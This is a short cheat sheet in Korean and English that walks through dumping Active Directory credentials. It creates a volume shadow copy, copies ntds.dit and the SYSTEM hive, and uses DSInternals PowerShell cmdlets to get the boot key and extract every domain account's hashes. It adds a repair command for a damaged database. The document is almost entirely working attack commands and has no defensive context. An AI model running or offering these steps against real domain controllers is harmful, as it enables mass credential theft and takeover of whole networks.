

1.  Copy ntds.dit file
```
(cmd)

vssadmin create shadow /for=C:

copy <Shadow Copy Volume Name>\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

2. Decryption
```
(cmd)

reg SAVE HKLM\SYSTEM c:\temp\SYS ## ntds.dit, SYS 파일 복사본 획득 시 DC 이외에서도 가능

(powershell)

$Key = Get-BootKey -SystemHiveFilePath C:\temp\SYS
Get-ADDBAccount -All -BootKey $Key -DBPath C:\temp\ntds.dit
```

3. 에러 발생시 아래 커맨드 후 재시도
```
(cmd)

ESENTUTL /p C:\temp\ntds.dit /!10240 /8 /o
```